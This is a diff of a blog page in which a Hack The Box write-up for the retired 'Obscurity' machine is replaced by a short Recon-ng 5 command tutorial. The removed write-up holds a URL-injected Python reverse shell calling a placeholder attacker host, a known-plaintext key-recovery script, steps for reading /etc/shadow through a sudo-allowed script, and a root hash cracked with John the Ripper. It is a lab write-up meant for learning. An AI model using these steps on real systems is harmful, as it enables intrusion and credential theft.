@@ -3,33 +3,39 @@
 <head>
     <meta charset="utf-8">
 
-    <title>HTB Write-up | Obscurity</title>
+    <title>Recon-ng 5 | The Basics</title>
 
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
+    <link rel="canonical" href="https://inesmartins.github.io//reconng5-the-basics/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
     
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
-    <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-12-08T10:38:05.000Z" />
+    <meta property="og:title" content="Recon-ng 5 | The Basics" />
+    <meta property="og:description" content="1. Get the latest version of the Recon-ng. sudo apt-get update sudo apt-get install recon-ng 2. Start the application. recon-ng 3. List workspaces. [recon-ng][default] &amp;gt; workspaces list +------------+ | Workspaces | +------------+ | default | +------------+ 4. Create a new workspace. [recon-ng][default] &amp;gt; workspaces create testymcgee [recon-ng][testymcgee] &amp;gt; 5. Select a" />
+    <meta property="og:url" content="https://inesmartins.github.io//reconng5-the-basics/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/recon-ng.png" />
+    <meta property="article:published_time" content="2020-06-07T17:32:03.000Z" />
+    <meta property="article:modified_time" content="2020-06-13T21:45:52.000Z" />
+    <meta property="article:tag" content="recon-ng" />
+    <meta property="article:tag" content="kali" />
+    <meta property="article:tag" content="tutorial" />
+    
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
+    <meta name="twitter:title" content="Recon-ng 5 | The Basics" />
+    <meta name="twitter:description" content="1. Get the latest version of the Recon-ng. sudo apt-get update sudo apt-get install recon-ng 2. Start the application. recon-ng 3. List workspaces. [recon-ng][default] &amp;gt; workspaces list +------------+ | Workspaces | +------------+ | default | +------------+ 4. Create a new workspace. [recon-ng][default] &amp;gt; workspaces create testymcgee [recon-ng][testymcgee] &amp;gt; 5. Select a" />
+    <meta name="twitter:url" content="https://inesmartins.github.io//reconng5-the-basics/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/recon-ng.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="recon-ng, kali, tutorial" />
     <meta name="twitter:site" content="@inesmartns" />
-    <meta property="og:image:width" content="594" />
-    <meta property="og:image:height" content="377" />
+    <meta property="og:image:width" content="729" />
+    <meta property="og:image:height" content="347" />
     
     <script type="application/ld+json">
 {
@@ -58,17 +64,18 @@
         "url": "https://inesmartins.github.io//author/ines/",
         "sameAs": []
     },
-    "headline": "HTB Write-up | Obscurity",
-    "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
-    "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-12-08T10:38:05.000Z",
+    "headline": "Recon-ng 5 | The Basics",
+    "url": "https://inesmartins.github.io//reconng5-the-basics/",
+    "datePublished": "2020-06-07T17:32:03.000Z",
+    "dateModified": "2020-06-13T21:45:52.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
-        "width": 594,
-        "height": 377
+        "url": "https://inesmartins.github.io//content/images/2020/06/recon-ng.png",
+        "width": 729,
+        "height": 347
     },
-    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
+    "keywords": "recon-ng, kali, tutorial",
+    "description": "1. Get the latest version of the Recon-ng\n[https://tools.kali.org/information-gathering/recon-ng].\n\nsudo apt-get update\nsudo apt-get install recon-ng\n\n\n2. Start the application.\n\nrecon-ng\n\n\n3. List workspaces.\n\n[recon-ng][default] &gt; workspaces list\n+------------+\n| Workspaces |\n+------------+\n| default |\n+------------+\n\n\n4. Create a new workspace.\n\n[recon-ng][default] &gt; workspaces create testymcgee\n[recon-ng][testymcgee] &gt;\n\n\n5. Select a workspace.\n\n[recon-ng][testymcgee] &gt; workspaces select defa",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -100,118 +107,61 @@
         <article class="post">
 
             <header class="post-header">
-                <h1 class="post-title">HTB Write-up | Obscurity</h1>
+                <h1 class="post-title">Recon-ng 5 | The Basics</h1>
                 <section class="post-meta">
                     <p class="author">by <a href="/author/ines/">Inês Martins</a></p>
                     <time class="post-date" datetime="2020-06-07">2020-06-07</time>
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://inesmartins.github.io//content/images/2020/06/1-1.png" width="600" height="400" layout="responsive"></amp-img>
+                <amp-img src="https://inesmartins.github.io//content/images/2020/06/recon-ng.png" width="600" height="400" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
-                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -A obscurity.htb
-
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
-```</code></pre>
-<p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+                <p>1. Get the latest version of the <a href="https://tools.kali.org/information-gathering/recon-ng">Recon-ng</a>.</p><pre><code>sudo apt-get update
+sudo apt-get install recon-ng
 </code></pre>
-<p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<p>2. Start the application.</p><pre><code>recon-ng
 </code></pre>
-<hr></hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><pre><code>$ cat etc/passwd
-...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
+<p>3. List workspaces.</p><pre><code>[recon-ng][default] &gt; workspaces list
++------------+
+| Workspaces |
++------------+
+| default |
++------------+
 </code></pre>
-<p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
+<p>4. Create a new workspace.</p><pre><code>[recon-ng][default] &gt; workspaces create testymcgee
+[recon-ng][testymcgee] &gt;
 </code></pre>
-<pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
-
-$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v
-
-$ cat passwordreminder.txt
-´ÑÈÌÉàÙÁÑé¯·¿
+<p>5. Select a workspace.</p><pre><code>[recon-ng][testymcgee] &gt; workspaces select default
+[recon-ng][default] &gt;
 </code></pre>
-<p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br />Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br /><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><pre><code>import sys
-
-# extend alphabet if necessary
-alphabet = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ"
-
-def decode_ciphertext(ciphertext, key):
-    key_pos = 0
-    plaintext = ""
-    for x in ciphertext:
-        new_char = chr((ord(x) - ord(key[key_pos])) % 255)
-        plaintext += new_char
-        key_pos += 1
-        key_pos = key_pos % len(key)
-    return plaintext
-
-def get_key(p1, c1):
-    i = 0
-    key = ""
-    while i &lt; len(p1):
-        found_match = False
-        for x in alphabet:
-            new_char = chr((ord(p1[i]) + ord(x)) % 255)
-            if new_char == c1[i]:
-                print("Found match, current key is " + key)
-                found_match = True
-                i += 1
-                key += x
-        if found_match == False:
-            print("Couldn't find match for char at index " + str(i))
-            return 0
-    return key
-
-def main(argv):
-    p1 = open(argv[0], "r").read()
-    c1 = open(argv[1], "r").read()
-    c2 = open(argv[2], "r").read()
-
-    print("\nKnown plaintext: \n" + p1)
-    print("Known ciphertext: \n" + c1)
-    print("Ciphertext to decode: \n" + c2)
-
-    key = get_key(p1, c1)
-    if key == 0:
-        print("Unable to calculate key!")
-    else:
-        p2 = decode_ciphertext(c2, key)
-        print("Original plaintext: " + p2)
-
-if __name__ == "__main__":
-    if len(sys.argv) &lt; 3:
-        print("Please specify the following arguments:")
-        print("[0] known plaintext file")
-        print("[1] known ciphertext file")
-        print("[2] ciphertext to decode")
-    else:
-        main(sys.argv[1:])</code></pre><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
+<p>6. Delete a workspace.</p><pre><code>[recon-ng][default] &gt; workspaces delete testymcgee
 </code></pre>
-<p>Let's run <code>BetterSSH</code> as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
+<p>7. Refresh the marketplace index.</p><pre><code>[recon-ng][default] &gt; marketplace refresh
+[*] Marketplace index refreshed.
 </code></pre>
-<p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
-$ echo "root:x:0:0:root:/root:/bin/bash" &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
+<p>8. List all modules available on marketplace.</p><pre><code>[recon-ng][default] &gt; marketplace search
 </code></pre>
-<p>That's it, hope you enjoyed it!</p>
+<p>9. Find a specific module.</p><pre><code>[recon-ng][default] &gt; marketplace search [module]
+</code></pre>
+<p>10. Install a module.</p><pre><code>[recon-ng][default] &gt; marketplace install [module_path]
+</code></pre>
+<p>11. Start using a module.</p><pre><code>[recon-ng][default] &gt; modules load [module_path]
+</code></pre>
+<p>12. List the selected module's options.List the module's name, author, version, description and options.</p><pre><code>[recon-ng][default][hackertarget] &gt; info
+</code></pre>
+<p>13. Configure the module's options.</p><pre><code>[recon-ng][default][hackertarget] &gt; options set SOURCE [host]
+SOURCE =&gt; [host]
+</code></pre>
+<p>14. Run the module.</p><pre><code>[recon-ng][default][hackertarget] &gt; run
+</code></pre>
+<p>15. Return to the "main menu".</p><pre><code>[recon-ng][default][hackertarget] &gt; back
+[recon-ng][default] &gt;
+</code></pre>
+<p>16. Exit the app.</p><pre><code>[recon-ng][default] &gt; exit
+</code></pre>
+
 
             </section>
 
